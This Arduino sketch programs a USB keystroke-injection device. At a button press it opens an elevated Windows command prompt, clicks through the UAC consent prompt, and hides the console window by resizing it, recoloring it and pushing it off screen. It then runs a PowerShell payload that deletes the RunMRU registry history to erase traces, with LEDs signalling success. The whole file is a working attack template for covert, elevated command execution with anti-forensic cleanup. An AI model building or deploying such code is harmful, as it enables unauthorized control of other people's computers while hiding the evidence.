#include "Keyboard.h"

const int buttonPin = 9;
int LED1 = 7, LED2 = 8, LED3 = 13, buttonState = 0;

void setup()
{
  pinMode(LED1, OUTPUT);
  pinMode(LED2, OUTPUT);
  pinMode(LED3, OUTPUT);
  pinMode(2, INPUT_PULLUP);
  Keyboard.begin();
  pinMode(buttonPin, INPUT);
}

void loop()
{
   buttonState = digitalRead(buttonPin);
   
  if (buttonState == HIGH) {
     //code you only run if button was pressed
     //LAUNCHES ELEVATED TERMINAL SESSION
     //===================================//
         digitalWrite(LED3, LOW);
         delay(3000);
         Keyboard.press(0x83);
         delay(100);
         Keyboard.press('r');
         delay(100);
         Keyboard.releaseAll();
         delay(1000);
    
     //BYPASS UAC PROMPT
         Keyboard.print("powershell Start-Process cmd -Verb runAs");
         delay(100);
         Keyboard.press(0xB0);
         delay(100);
         Keyboard.releaseAll();
         delay(4000);

         Keyboard.press(0x82);
         delay(100);
         Keyboard.press('y');
         delay(100);
         Keyboard.releaseAll();
         delay(1000);
    
     //OBFUSCATES CMD
         Keyboard.print("mode con:cols=18 lines=1");
         delay(100);
         Keyboard.write(0xB0);
         delay(100);
         Keyboard.print("color F7");
         delay(100);
         Keyboard.write(0xB0);
         delay(200);
         Keyboard.press(0x82);
         delay(100);
         Keyboard.press(' ');
         delay(100);
         Keyboard.press('m');
         delay(100);
         Keyboard.releaseAll();
         delay(500);

         for (int i = 0; i < 100; i++){
           Keyboard.press(0xD9);
           delay(10);
           Keyboard.releaseAll();
           delay(20);
           Keyboard.press(0xD8);
           delay(10);
           Keyboard.releaseAll();
           delay(20);
         }
    Keyboard.write(0xB0);
    delay(500);
    
     //EXEC PAYLOAD
         Keyboard.print("powershell ");
         Keyboard.print("\"");
         Keyboard.print("Remove-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU' -Name ");
         Keyboard.print("'*' -ErrorAction SilentlyContinue");
         Keyboard.print("\"");
         delay(100);
         Keyboard.write(0xB0);
         delay(200);
         Keyboard.print("exit");
         delay(100);
         Keyboard.write(0xB0);
         delay(100);
    
     //LED CONFIG FOR EXECUTION CONFIRMATION
     //===================================//
        for (int w = 0; w < 15; w++){
         digitalWrite(LED1, HIGH);
         digitalWrite(LED2, LOW);
         delay(300);
         digitalWrite(LED1, LOW);
         digitalWrite(LED2, HIGH);
         delay(300);
        }
         digitalWrite(LED1, LOW);
         digitalWrite(LED2, LOW);

  } else {
       digitalWrite(LED3, HIGH);
        }
  }

